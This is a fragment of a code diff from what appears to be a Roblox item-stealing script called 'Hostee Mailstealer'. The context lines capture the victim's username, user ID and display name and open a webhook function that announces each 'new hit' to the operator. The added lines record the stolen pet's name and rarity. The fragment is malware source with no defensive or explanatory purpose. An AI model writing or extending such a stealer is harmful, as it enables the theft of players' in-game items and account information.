@@ -16,6 +16,9 @@ _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Ran
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
+_G.PetName = v2.name
+_G.PetRar = v2.rarity
+
 local function sendwebhook(msg)
 local msg = {
   ["content"]= "|| @everyone || **Hostee Mailstealer has detected a new hit!**",
